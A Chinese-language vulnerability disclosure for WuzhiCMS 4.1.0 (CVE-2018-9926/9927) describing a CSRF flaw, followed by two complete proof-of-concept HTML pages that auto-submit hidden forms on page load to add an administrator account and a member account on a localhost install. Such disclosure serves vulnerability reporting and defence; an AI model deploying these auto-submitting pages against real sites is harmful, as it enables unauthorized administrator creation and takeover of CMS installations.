### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|五指CMS 4.1.0存在CSRF漏洞可增加管理员账户|2018-04-10|套哥（taoge@5ecurity.cn）|[https://github.com/wuzhicms/wuzhicms](https://github.com/wuzhicms/wuzhicms) | [https://github.com/wuzhicms/wuzhicms](https://github.com/wuzhicms/wuzhicms) |4.1.0| [CVE-2018-9926](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9926)/[CVE-2018-9927](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9927)|  

#### 漏洞概述  

> 五指CMS 4.1.0版本存在一个CSRF漏洞，当管理员登陆后访问下面CSRF测试页面可将普通用户提成为管理员权限。五指CMS是一个在github上开源的CMS系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/wuzhicms/wuzhicms/issues/128)告知作者。   


### POC实现代码如下：  

> CSRF测试页面代码一如下：  
 
``` html
<html><body>
    <script type="text/javascript">
    function post(url,fields)
    {
    var p = document.createElement("form");
    p.action = url;
    p.innerHTML = fields;
    p.target = "_self";
    p.method = "post";
    document.body.appendChild(p);
    p.submit();
    }
    function csrf_hack()
    {
    var fields;
    
    fields += "<input type='hidden' name='form[role][]' value='1' />";
    fields += "<input type='hidden' name='form[username]' value='hack123' />"; 
    fields += "<input type='hidden' name='form[password]' value='' />"; 
    fields += "<input type='hidden' name='form[truename]' value='taoge@5ecurity' />"; 
    
    var url = "http://127.0.0.1/www/index.php?m=core&f=power&v=add&&_su=wuzhicms&_menuid=61&_submenuid=62&submit=提交";
    post(url,fields);
    }
    window.onload = function() { csrf_hack();}
    </script>
    </body></html>
```

> CSRF测试页面代码二如下：  

``` html
<html><body>
<script type="text/javascript">
function post(url,fields)
{
var p = document.createElement("form");
p.action = url;
p.innerHTML = fields;
p.target = "_self";
p.method = "post";
document.body.appendChild(p);
p.submit();
}
function csrf_hack()
{
var fields;

fields += "<input type='hidden' name='info[username]' value='hack123' />";
fields += "<input type='hidden' name='info[password]' value='hacktest' />"; 
fields += "<input type='hidden' name='info[pwdconfirm]' value='hacktest' />"; 
fields += "<input type='hidden' name='info[email]' value='taoge@5ecurity.cn' />"; 
fields += "<input type='hidden' name='info[mobile]' value='' />"; 
fields += "<input type='hidden' name='modelids[]' value='10' />"; 
fields += "<input type='hidden' name='info[groupid]' value='3' />"; 
fields += "<input type='hidden' name='pids[]' value='0' />"; 
fields += "<input type='hidden' name='pids[]' value='0' />"; 
fields += "<input type='hidden' name='pids[]' value='0' />";
fields += "<input type='hidden' name='pids[]' value='0' />"; 
fields += "<input type='hidden' name='avatar' value='' />"; 
fields += "<input type='hidden' name='islock' value='0' />";
fields += "<input type='hidden' name='sys_name' value='0' />";
fields += "<input type='hidden' name='info[birthday]' value='' />"; 
fields += "<input type='hidden' name='info[truename]' value='' />"; 
fields += "<input type='hidden' name='info[sex]' value='0' />";
fields += "<input type='hidden' name='info[marriage]' value='0' />";

var url = "http://127.0.0.1/www/index.php?m=member&f=index&v=add&_su=wuzhicms&_menuid=30&_submenuid=74&submit=提交";
post(url,fields);
}
window.onload = function() { csrf_hack();}
</script>
</body></html>
```